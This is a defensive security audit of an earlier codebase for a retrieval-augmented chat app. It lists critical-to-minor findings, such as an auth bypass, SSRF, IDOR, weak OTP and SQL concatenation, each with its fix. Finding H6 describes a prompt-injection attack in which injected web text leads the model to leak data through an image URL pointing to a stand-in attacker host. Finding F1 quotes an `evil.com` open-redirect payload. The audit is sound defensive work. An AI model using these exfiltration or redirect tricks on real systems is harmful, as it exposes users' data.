# Security & quality audit of the previous codebase

Audited: the version of this repository before the refactor (September 2026). File and line
references point to that version (still available as the staged baseline: `git show :<path>`).
Every finding below is fixed in the current code unless marked otherwise.

## Rating: 2.5 / 10

| Area | Score | Why |
|---|---|---|
| Security | 1 / 10 | Authentication was bypassed for every route; unauthenticated SSRF, data deletion and cost abuse; hard-coded secrets. |
| Architecture | 2.5 / 10 | No layers: SQL, auth and business logic scattered through routes; a 703-line client "god component"; metadata smuggled inside the answer text. |
| Correctness | 3 / 10 | `next build` failed; notebooks (collections), branching and conversation titles were broken. |
| Maintainability | 3 / 10 | ~1 000 lines of dead code, two diverging login UIs, no tests, no migrations, outdated README. |
| Performance | 3 / 10 | One embedding request per chunk, no ANN index possible, per-instance in-memory state. |
| UI / UX | 6 / 10 | Polished look, but several interaction bugs. |

The UI looked finished, which hid the fact that the server was effectively open to the internet.

## Critical

| # | Finding | Where | Fix |
|---|---|---|---|
| C1 | **Middleware made every path public.** `'/'` was in `PUBLIC_PATHS` and the prefix rule `p.endsWith('/') && pathname.startsWith(p)` matches every pathname. Reproduced: `/api/corpus`, `/api/chat`, `/api/learn/url` all returned `true` from `isPublicPath`. | `middleware.ts:7,11` | Exact-match allowlist (`server/auth/public-paths.ts`), fail closed, tested. |
| C2 | **No authorisation in any route handler.** With C1, anyone could `DELETE /api/corpus` (wipe everything), delete chunks/sources, read or overwrite every conversation, read every user's queries, and ingest content on the owner's Gemini bill. | `app/api/corpus/route.ts:10-16`, `corpus/chunks/route.ts:29`, `conversations/*`, `analytics/route.ts`, `learn/*` | Every handler goes through `authedRoute`; every query is scoped by `owner_id`; foreign ids return 404. HTTP tests cover IDOR. |
| C3 | **Full-read SSRF.** `url.startsWith('http')` then `fetch(url)` (redirects followed). Cloud metadata (`169.254.169.254`), localhost and private services could be fetched and the response read back through the chunk explorer. No body size limit. | `app/api/learn/url/route.ts:27,35,52` | `server/security/ssrf.ts`: DNS answers checked at connect time (anti-rebinding), private/reserved ranges blocked (IPv4 + IPv6 + mapped), redirects re-validated, 5 MB decompressed cap, timeout. 13 tests. |
| C4 | **Next.js 14.2.21 with critical advisories**, incl. middleware authorisation bypass (GHSA-f82v-jwr5-mffw) and unauthenticated RCE on Windows-hosted servers (GHSA-p293-qw3h-jr36). The newest 14.x (14.2.35) is still affected by the RCEs. | `package.json` | Upgraded to Next 15.5.26 / React 19. |

## High

| # | Finding | Where | Fix |
|---|---|---|---|
| H1 | **Hard-coded credentials and signing key.** A default admin username and password were live whenever AUTH_USERNAME/PASSWORD were not set, with no rate limit; with AUTH_SECRET unset, sessions could be forged with a fallback key written in the source. `GET /api/auth` also leaked the admin username. | `lib/auth.ts:5,17,44`, `app/api/auth/route.ts:22,29` | Password login removed; `AUTH_SECRET` (≥32 chars) is mandatory, no fallback. |
| H2 | **Open sign-up into a shared, all-admin workspace.** Any email (OTP) or Google/GitHub account could sign in, every token had `role: 'admin'`, and no table had an owner column — every stranger saw and could delete everyone's data. | `lib/auth.ts:52`, `scripts/init-db.ts` | Per-user ownership on all tables; optional `AUTH_ALLOWED_EMAILS` / `AUTH_ALLOWED_DOMAINS`. |
| H3 | **OAuth without `state` / PKCE** (login CSRF), redirect URI derived from the Host header, Google `verified_email` not checked, GitHub public profile email trusted. | `app/api/auth/oauth/google/route.ts:18`, `callback/route.ts:30,59,94` | Signed state cookie with `state` + PKCE, `APP_URL`-based redirect URI, verified emails only. |
| H4 | **Weak OTP.** `Math.random()` codes, in-memory store (lost on restart, broken on serverless), unlimited re-issue, spoofable `X-Forwarded-For` rate limiting; leftover `getDevOtp` and a login page expecting the code in the HTTP response (`devCode`). | `lib/otpStore.ts:8,23,64`, `lib/rateLimit.ts:6,69`, `app/login/page.tsx:57-58` | `crypto.randomInt`, HMAC-hashed codes in Postgres, atomic attempt counting and single-use consumption, per-email and per-IP limits, no enumeration. |
| H5 | **Denial of wallet / DoS.** No size limits on pasted text; uploads fully buffered by `request.formData()` before the 15 MB check; unlimited files; unbounded client-supplied chat history sent to the model. | `app/api/learn/route.ts`, `learn/upload/route.ts:21`, `lib/extractFileText.ts:81`, `app/api/chat/route.ts:29` | Streaming byte caps before parsing, per-document char/chunk caps, file count caps, server-side history (last 8 turns), per-user rate limits in Postgres. |
| H6 | **Prompt injection → data exfiltration.** Untrusted web/YouTube text was pasted into the system prompt; the Markdown renderer loaded images from any URL (`![](https://attacker/?q=…)`); no CSP; clients could forge assistant turns. | `app/api/chat/route.ts:83-95`, `components/markdown.tsx:45` | Sources delimited + escaped in the user turn and declared untrusted; images never loaded; links http(s) only; CSP `img-src`/`connect-src 'self'`; history from DB only. |
| H7 | **Metadata inside the answer stream.** `<!--CITATIONS:…-->` / `<!--AGENT_STEPS:…-->` were appended to the model text and the client parsed the first match — the model (or injected content) could forge citations; any excerpt containing `-->` broke parsing (reproduced). | `app/api/chat/route.ts:117,134`, `components/chat-message.tsx:57,67` | Typed NDJSON event protocol (`lib/stream-protocol.ts`). |
| H8 | **Vulnerable dependencies:** 12 advisories (2 critical, 7 high) — next, langchain / @langchain/core (serialisation injection → secret extraction), @langchain/community (expr-eval), langsmith, nanoid, postcss, uuid. | `package.json` | LangChain, `ai`, `vaul` and unused Radix packages removed; Next upgraded. Now 3 advisories, all inside Next's build-time postcss/nanoid (not reachable at runtime). |

## Medium

| # | Finding | Where | Fix |
|---|---|---|---|
| M1 | SQL assembled by string concatenation with hand-rolled quote escaping; LIKE wildcards unescaped; `LIMIT NaN` crashes. | `lib/db.ts:43,100-105,133-162`, `lib/hybridSearch.ts:53-57`, `corpus/chunks/route.ts:15-16` | All SQL parameterised in `server/repositories`; LIKE escaping; zod-coerced paging. |
| M2 | Client-chosen ids with `ON CONFLICT DO UPDATE` let callers overwrite other conversations/messages; predictable ids (`conv_${Date.now()}`); `msg_user_${Date.now()}` collisions overwrote messages across conversations. | `lib/db.ts:219,274`, `conversations/route.ts:24,38`, `chat/route.ts:146-147` | Server-generated UUIDs, owner-checked writes, insert-only messages. |
| M3 | Internal error messages (database, provider) returned to clients from every route. | all `app/api/**` | Typed `AppError`s; unknown errors → generic 500 + request id. |
| M4 | Open redirect after login via `?next=`. | `app/login/page.tsx:97` | `safeRedirectPath` (relative, same-origin only), tested. |
| M5 | No CSRF defence beyond SameSite, no security headers. | — | `Origin` check on all writes; CSP, XFO, HSTS, nosniff, Referrer/Permissions-Policy. |
| M6 | Analytics exposed every user's questions. | `lib/db.ts:323-335` | Owner-scoped analytics. |

## Functional and architectural defects

| # | Defect | Where | Fix |
|---|---|---|---|
| B1 | `npm run build` failed (ESLint error, `useSearchParams` without Suspense) — the app could not be deployed. | `components/auth-modal.tsx:339`, `app/login/page.tsx:15` | Builds cleanly. |
| B2 | Middleware imported Node `crypto` in the Edge runtime; it only "worked" because C1 skipped the code path. | `lib/auth.ts:2` | Web Crypto (edge-safe). |
| B3 | Notebooks silently broken: LangChain never wrote the `collection_id` column (DEFAULT `'default'`) and queries used `coalesce(collection_id, …)`, so every chunk counted as "default". | `scripts/init-db.ts:32`, `lib/db.ts:43`, `lib/hybridSearch.ts:55` | Real `collections` table and foreign keys; the legacy importer recovers the intended notebook from metadata. |
| B4 | Branching copied nothing for saved conversations (re-used ids hit `ON CONFLICT` on the parent's rows). | `app/page.tsx:235`, `lib/db.ts:274` | Server-side branch in one SQL statement. |
| B5 | Conversation title overwritten by every new message; renaming reset the notebook to "default". | `lib/db.ts:219-221`, `conversations/[id]/route.ts:51` | Title set once; PATCH only renames. |
| B6 | Voice dictation duplicated text (interim results appended). | `app/page.tsx:328-330` | Only final results appended once (`hooks/use-speech-input.ts`). |
| B7 | Analytics tab crashed when the API returned an error. | `components/analytics-dashboard.tsx:90` | Error states everywhere. |
| B8 | "Agent mode" displayed hard-coded fake reasoning steps. | `app/api/chat/route.ts:65` | Real deep mode: model-planned queries, fused retrieval, honest steps. |
| B9 | One embedding request per chunk (10 in parallel, no retry); a cached rejected promise broke ingestion until restart. | `lib/embeddings.ts:22,29`, `lib/vectorStore.ts:12` | Batched `batchEmbedContents` (100/request), retries with backoff, dimension checks. |
| B10 | Auth gate was a client-side modal over a page that had already loaded data. | `app/page.tsx:94-98` | Server-side session check before rendering. |
| B11 | ~1 000 lines of dead code and two diverging login UIs; README pointed to a missing `.env.example` and `starter/`. | `components/ingestion-hub.tsx`, `file-upload-zone.tsx`, `lib/rag.ts`, `lib/sanitizeContent.ts`, `components/ui/*` | Single login form; components rewritten or reused; see Cleanup in ARCHITECTURE.md for the remaining obsolete files. |
| B12 | `.npmrc` `legacy-peer-deps=true` hid dependency conflicts. | `.npmrc` | Removed; dependency tree resolves cleanly. |

## Follow-up review of the refactored code (September 2026)

A second review covered the new features: connectors, chat-app bots, share links, sessions and the
deployment surface.

| # | Finding | Severity | Fix |
|---|---|---|---|
| F1 | Open redirect after sign-in (`/.//evil.com` normalised to a protocol-relative URL). | Medium | `lib/safe-redirect.ts` rejects protocol-relative targets before and after normalisation. |
| F2 | Deleting a bot's notebook widened the bot to every notebook of the workspace. | Medium | Migration v14 `all_notebooks`; the bot replies that its notebook is gone and marks itself as failed. |
| F3 | A removed member's connectors kept syncing into the workspace with their old rights. | Medium | Removing a member deletes their connections and revokes their links; every sync re-checks its adder's current rights. |
| F4 | Admins could not see or revoke other members' public links. | Low | Admin list (`/api/workspaces/:id/shares`) with revoke; share audit events name the link. |
| F5 | OTP errors told apart unknown, expired and wrong codes; no per-address limit on guesses. | Low | One message for every failure; a daily cap per address; constant-time compare. |
| F6 | `X-Forwarded-For` trusted from its first (client-controlled) entry. | Low | Only the entries appended by `TRUST_PROXY` trusted proxies count. |
| F7 | Bot replies could ping `@channel` or disguise links in Slack. | Low | Replies and citation titles are escaped for Slack. |
| F8 | Teams key refetch could be triggered on every request; the `serviceurl` claim was optional. | Minor | Refetch at most every 5 minutes; the claim is required and must match. |
| F9 | The shared page (`/s/:token`) had no rate limit. | Minor | Per-IP limit. |
| F10 | Stateless sessions could not be revoked; the CSP needed `'unsafe-inline'` for scripts. | Low | Server-side sessions (v13) with sign-out everywhere; a per-request nonce CSP. |
| F11 | Rotating `AUTH_SECRET` meant losing every stored credential. | Low | Key ring (`AUTH_SECRET_PREVIOUS`) and `npm run secrets:reseal`; after a hard rotation, unreadable share links stay listed so they can be revoked. |
| F12 | A misconfigured production deploy started and failed later, per request. | Low | `server/config-check.ts` stops the server and the worker at start with a clear message. |

## Still open / out of scope

- Admins add members by email without the member's consent, and the response reveals whether an account exists (needs an invitation-acceptance flow).
- If the previous version was ever reachable from the internet, treat its data and API keys as exposed: rotate `GOOGLE_API_KEY`, OAuth client secrets, `RESEND_API_KEY` and the database password.
